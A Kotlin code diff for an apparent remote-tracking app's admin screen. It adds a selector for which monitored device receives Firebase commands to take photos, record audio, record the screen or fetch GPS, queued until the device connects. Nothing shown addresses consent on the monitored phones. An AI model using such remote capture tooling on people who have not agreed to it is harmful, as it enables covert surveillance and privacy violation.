@@ -85,6 +85,14 @@ data class ScreenItem(
     val duration: Int = 10
 )
 
+data class SubDeviceInfo(
+    val id: String = "",
+    val name: String = "",
+    val model: String = "",
+    val battery: Int? = null,
+    val lastSeen: Long = 0L
+)
+
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
 fun BigAdminScreen(
@@ -141,12 +149,37 @@ fun BigAdminScreen(
     var screenList by remember { mutableStateOf<List<ScreenItem>>(emptyList()) }
     var currentScreenIndex by remember { mutableStateOf(0) }
 
+    var userDeviceList by remember { mutableStateOf<List<SubDeviceInfo>>(emptyList()) }
+    var selectedSubDeviceId by remember { mutableStateOf("all") }
+
     var mapWebViewInstance by remember { mutableStateOf<WebView?>(null) }
     var mediaPlayerInstance by remember { mutableStateOf<MediaPlayer?>(null) }
 
     DisposableEffect(currentDevId) {
         val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
         val devRef = database.getReference("tracking/devices/$currentDevId")
+
+        val devicesListener = object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val list = mutableListOf<SubDeviceInfo>()
+                for (child in snapshot.children) {
+                    val id = child.child("id").getValue(String::class.java) ?: child.key ?: ""
+                    val name = child.child("name").getValue(String::class.java) ?: ""
+                    val model = child.child("model").getValue(String::class.java) ?: ""
+                    val battery = child.child("battery").getValue(Int::class.java)
+                    val lastSeen = child.child("lastSeen").getValue(Long::class.java) ?: 0L
+                    if (id.isNotBlank()) {
+                        list.add(SubDeviceInfo(id, name, model, battery, lastSeen))
+                    }
+                }
+                userDeviceList = list
+                if (list.isNotEmpty() && selectedSubDeviceId != "all" && list.none { it.id == selectedSubDeviceId }) {
+                    selectedSubDeviceId = "all"
+                }
+            }
+            override fun onCancelled(error: DatabaseError) {}
+        }
+        devRef.child("devices").addValueEventListener(devicesListener)
 
         val heartbeatListener = object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
@@ -192,9 +225,7 @@ fun BigAdminScreen(
                     }
                 }
                 photoList = list
-                if (currentPhotoIndex >= list.size) {
-                    currentPhotoIndex = (list.size - 1).coerceAtLeast(0)
-                }
+                currentPhotoIndex = (list.size - 1).coerceAtLeast(0)
             }
             override fun onCancelled(error: DatabaseError) {}
         }
@@ -211,9 +242,7 @@ fun BigAdminScreen(
                     }
                 }
                 audioList = list
-                if (currentAudioIndex >= list.size) {
-                    currentAudioIndex = (list.size - 1).coerceAtLeast(0)
-                }
+                currentAudioIndex = (list.size - 1).coerceAtLeast(0)
             }
             override fun onCancelled(error: DatabaseError) {}
         }
@@ -233,9 +262,7 @@ fun BigAdminScreen(
                     }
                 }
                 screenList = list
-                if (currentScreenIndex >= list.size) {
-                    currentScreenIndex = (list.size - 1).coerceAtLeast(0)
-                }
+                currentScreenIndex = (list.size - 1).coerceAtLeast(0)
             }
             override fun onCancelled(error: DatabaseError) {}
         }
@@ -287,6 +314,7 @@ fun BigAdminScreen(
         devRef.child("commands/record_screen").addValueEventListener(screenCmdListener)
 
         onDispose {
+            devRef.child("devices").removeEventListener(devicesListener)
             devRef.child("heartbeat").removeEventListener(heartbeatListener)
             devRef.child("info").removeEventListener(infoListener)
             devRef.child("location").removeEventListener(locListener)
@@ -455,6 +483,62 @@ fun BigAdminScreen(
                                 }
                             }
 
+                            if (userDeviceList.size > 1) {
+                                Spacer(modifier = Modifier.height(10.dp))
+                                Surface(
+                                    shape = RoundedCornerShape(8.dp),
+                                    color = Color(0xFFF0FDF4),
+                                    border = androidx.compose.foundation.BorderStroke(1.dp, Color(0xFF86EFAC)),
+                                    modifier = Modifier.fillMaxWidth()
+                                ) {
+                                    Column(modifier = Modifier.padding(10.dp)) {
+                                        Text("Buyruq yuboriladigan qurilmani tanlang:", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color(0xFF15803D))
+                                        Spacer(modifier = Modifier.height(6.dp))
+                                        var devExp by remember { mutableStateOf(false) }
+                                        Box(modifier = Modifier.fillMaxWidth()) {
+                                            OutlinedButton(
+                                                onClick = { devExp = true },
+                                                modifier = Modifier.fillMaxWidth(),
+                                                colors = ButtonDefaults.outlinedButtonColors(containerColor = Color.White),
+                                                shape = RoundedCornerShape(8.dp),
+                                                contentPadding = PaddingValues(horizontal = 10.dp, vertical = 6.dp)
+                                            ) {
+                                                val selectedTitle = if (selectedSubDeviceId == "all") "🌐 Barcha qurilmalar (${userDeviceList.size} ta)" else {
+                                                    val d = userDeviceList.find { it.id == selectedSubDeviceId }
+                                                    d?.name?.ifBlank { d.model } ?: "Tanlangan qurilma"
+                                                }
+                                                Text(selectedTitle, fontSize = 12.sp, fontWeight = FontWeight.SemiBold, color = Color(0xFF166534))
+                                            }
+                                            DropdownMenu(
+                                                expanded = devExp,
+                                                onDismissRequest = { devExp = false }
+                                            ) {
+                                                DropdownMenuItem(
+                                                    text = { Text("🌐 Barcha qurilmalar (${userDeviceList.size} ta)") },
+                                                    onClick = {
+                                                        selectedSubDeviceId = "all"
+                                                        devExp = false
+                                                    }
+                                                )
+                                                userDeviceList.forEach { dev ->
+                                                    val isDevOnline = (System.currentTimeMillis() - dev.lastSeen) < 70000L
+                                                    val icon = if (isDevOnline) "🟢" else "⚪"
+                                                    val bText = if (dev.battery != null) " (${dev.battery}%)" else ""
+                                                    val title = (dev.name.ifBlank { dev.model }).ifBlank { dev.id }
+                                                    DropdownMenuItem(
+                                                        text = { Text("$icon $title$bText", fontSize = 13.sp) },
+                                                        onClick = {
+                                                            selectedSubDeviceId = dev.id
+                                                            devExp = false
+                                                        }
+                                                    )
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+
                             Spacer(modifier = Modifier.height(10.dp))
 
                             Row(
@@ -518,8 +602,10 @@ fun BigAdminScreen(
                                         }
                                         lastPhotoClickTime = now
                                         val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
+                                        database.getReference("tracking/devices/$currentDevId/commands/target_device_id").setValue(selectedSubDeviceId)
                                         database.getReference("tracking/devices/$currentDevId/commands/take_photo").setValue(System.currentTimeMillis())
-                                        val msg = if (isOnline) "Rasmga olish buyrug'i yuborildi" else "Rasm olish buyrug'i navbatga qo'yildi (qurilma ulanganda olinadi)"
+                                        val devSuffix = if (selectedSubDeviceId != "all") " (tanlangan qurilmaga)" else ""
+                                        val msg = if (isOnline) "Rasmga olish buyrug'i yuborildi$devSuffix" else "Rasm olish buyrug'i navbatga qo'yildi$devSuffix"
                                         Toast.makeText(context, msg, Toast.LENGTH_SHORT).show()
                                     },
                                     modifier = Modifier.weight(1f),
@@ -535,9 +621,11 @@ fun BigAdminScreen(
                                         val newState = !isRecordingCommandActive
                                         isRecordingCommandActive = newState
                                         val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
+                                        database.getReference("tracking/devices/$currentDevId/commands/target_device_id").setValue(selectedSubDeviceId)
                                         database.getReference("tracking/devices/$currentDevId/commands/record_audio").setValue(newState)
+                                        val devSuffix = if (selectedSubDeviceId != "all") " (tanlangan qurilmaga)" else ""
                                         val msg = if (newState) {
-                                            if (isOnline) "Ovoz yozish boshlandi" else "Ovoz yozish navbatga qo'yildi"
+                                            if (isOnline) "Ovoz yozish boshlandi$devSuffix" else "Ovoz yozish navbatga qo'yildi$devSuffix"
                                         } else "Ovoz yozish to'xtatildi, saqlanmoqda..."
                                         Toast.makeText(context, msg, Toast.LENGTH_SHORT).show()
                                     },
@@ -563,9 +651,11 @@ fun BigAdminScreen(
                                         val newState = !isScreenRecordingCommandActive
                                         isScreenRecordingCommandActive = newState
                                         val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
+                                        database.getReference("tracking/devices/$currentDevId/commands/target_device_id").setValue(selectedSubDeviceId)
                                         database.getReference("tracking/devices/$currentDevId/commands/record_screen").setValue(newState)
+                                        val devSuffix = if (selectedSubDeviceId != "all") " (tanlangan qurilmaga)" else ""
                                         val msg = if (newState) {
-                                            if (isOnline) "Ekran yozish boshlandi..." else "Ekran yozish navbatga qo'yildi"
+                                            if (isOnline) "Ekran yozish boshlandi$devSuffix..." else "Ekran yozish navbatga qo'yildi$devSuffix"
                                         } else "Ekran yozish to'xtatildi, saqlanmoqda..."
                                         Toast.makeText(context, msg, Toast.LENGTH_SHORT).show()
                                     },
@@ -582,8 +672,10 @@ fun BigAdminScreen(
                                 OutlinedButton(
                                     onClick = {
                                         val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
+                                        database.getReference("tracking/devices/$currentDevId/commands/target_device_id").setValue(selectedSubDeviceId)
                                         database.getReference("tracking/devices/$currentDevId/commands/request_gps").setValue(System.currentTimeMillis())
-                                        val msg = if (isOnline) "GPS so'rovi yuborildi" else "GPS so'rovi navbatga qo'yildi"
+                                        val devSuffix = if (selectedSubDeviceId != "all") " (tanlangan qurilmaga)" else ""
+                                        val msg = if (isOnline) "GPS so'rovi yuborildi$devSuffix" else "GPS so'rovi navbatga qo'yildi$devSuffix"
                                         Toast.makeText(context, msg, Toast.LENGTH_SHORT).show()
                                     },
                                     modifier = Modifier.weight(1f),
